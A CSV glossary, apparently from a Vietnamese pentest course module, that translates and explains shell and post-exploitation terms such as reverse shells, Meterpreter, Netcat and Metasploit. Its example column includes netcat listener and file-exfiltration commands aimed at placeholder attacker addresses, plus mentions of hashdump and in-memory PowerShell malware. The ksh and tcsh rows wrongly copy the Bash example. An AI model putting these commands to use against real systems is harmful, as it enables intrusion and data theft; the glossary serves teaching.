"id","english","vietnamese","note","module","boi_canh","vi_du"
"55","Shell","Shell","quyền truy cập/phiên dòng lệnh trên hệ thống mục tiêu — tức "cửa sổ lệnh" mà attacker có thể dùng để chạy lệnh.","8","Là môi trường dòng lệnh mà attacker nhận được sau khi khai thác thành công, cho phép tương tác và kiểm soát hệ thống mục tiêu.","Sau khi khai thác một web server, attacker có được Shell và chạy lệnh whoami để kiểm tra danh tính người dùng hiện tại."
"56","Bash","Bash","Bourne Again SHell — shell dòng lệnh phổ biến trên Linux/Unix.","8","Là các loại shell mặc định trên hệ thống Linux/Unix. Attacker cần xác định loại shell để sử dụng đúng cú pháp lệnh và viết script.","Attacker nhận được một shell và chạy lệnh echo $SHELL, kết quả trả về là /bin/bash, cho biết đây là môi trường Bash."
"57","ksh","ksh","Korn shell — shell dòng lệnh trên Unix.","8","Là các loại shell mặc định trên hệ thống Linux/Unix. Attacker cần xác định loại shell để sử dụng đúng cú pháp lệnh và viết script.","Attacker nhận được một shell và chạy lệnh echo $SHELL, kết quả trả về là /bin/bash, cho biết đây là môi trường Bash."
"58","tcsh","tcsh","Tenex C shell — biến thể của csh, shell cho Unix.","8","Là các loại shell mặc định trên hệ thống Linux/Unix. Attacker cần xác định loại shell để sử dụng đúng cú pháp lệnh và viết script.","Attacker nhận được một shell và chạy lệnh echo $SHELL, kết quả trả về là /bin/bash, cho biết đây là môi trường Bash."
"59","Windows PowerShell","Windows PowerShell","shell/kịch bản dòng lệnh nâng cao trên Windows, hỗ trợ cmdlet và scripting.","8","Shell và môi trường scripting cực mạnh có sẵn trên Windows, thường được dùng để thực thi các tác vụ phức tạp và tấn công "sống trên đất địch" (LotL) nhằm qua mặt antivirus.","Attacker sử dụng một script PowerShell để tải và chạy mã độc trực tiếp trên RAM, không ghi file ra đĩa, nhằm đánh cắp mật khẩu."
"60","bind shell","bind shell","máy mục tiêu mở cổng lắng nghe để attacker kết nối và nhận phiên dòng lệnh.","8","Dùng khi máy mục tiêu có IP public và có thể nhận kết nối từ bên ngoài. Payload sẽ mở một cổng trên máy mục tiêu để chờ attacker kết nối đến.","Payload chạy trên server, mở cổng 1337. Attacker từ máy mình dùng lệnh nc <IP_server> 1337 để kết nối và nhận shell."
"61","reverse shell","reverse shell","máy mục tiêu kết nối ngược tới attacker, cung cấp phiên dòng lệnh cho attacker.","8","Dùng khi mục tiêu nằm sau tường lửa/NAT chặn kết nối từ ngoài vào. Đây là kỹ thuật vượt tường lửa phổ biến nhất để lấy shell.","Attacker chạy lệnh nc -lvp 4444 trên máy mình để lắng nghe. Payload trên máy nạn nhân sẽ thực thi lệnh kết nối đến IP của attacker tại cổng 4444."
"62","Meterpreter module","Meterpreter module","mô-đun/agent Meterpreter trong Metasploit — payload tương tác mạnh để điều khiển hệ thống.","8","Là một payload nâng cao của Metasploit, chạy hoàn toàn trong bộ nhớ của mục tiêu. Nó cung cấp một shell đa năng với nhiều tính năng hậu khai thác mạnh mẽ.","Sau khi có phiên Meterpreter, attacker chạy lệnh screenshot để chụp màn hình desktop của nạn nhân, hoặc hashdump để lấy mật khẩu."
"63","Netcat commands (see table in 8.1.2)","các lệnh Netcat","Netcat — tiện ích đọc/ghi qua kết nối mạng, dùng mở shell, chuyển port, tunneling.","8","Netcat (nc) là công cụ mạng đa năng, thường được dùng để nhanh chóng thiết lập listener cho reverse shell, kết nối đến bind shell, hoặc truyền file.","Để truyền file, attacker chạy nc -lvp 1234 > received_file trên máy mình và nc <attacker_IP> 1234 < secret_file trên máy nạn nhân."
"64","Metasploit framework","Metasploit framework","khung khai thác/phát triển exploit và payload phổ biến cho pentest.","8","Là một nền tảng (framework) toàn diện để tự động hóa quá trình kiểm thử xâm nhập, từ việc tìm và sử dụng exploit đến việc tạo payload.","Pentester dùng Metasploit (msfconsole) để chạy exploit EternalBlue, tự động tấn công và nhận về một phiên Meterpreter."
"65","Meterpreter commands (see table in 8.1.2)","các lệnh Meterpreter","tập lệnh/lệnh dùng để tương tác với phiên Meterpreter.","8","Là các lệnh chuyên dụng được sử dụng bên trong một phiên Meterpreter để thực hiện các tác vụ hậu khai thác như leo thang đặc quyền, di chuyển trong mạng.","Trong phiên Meterpreter, attacker dùng lệnh migrate <PID> để di chuyển tiến trình của mình vào explorer.exe nhằm ẩn mình và duy trì truy cập."
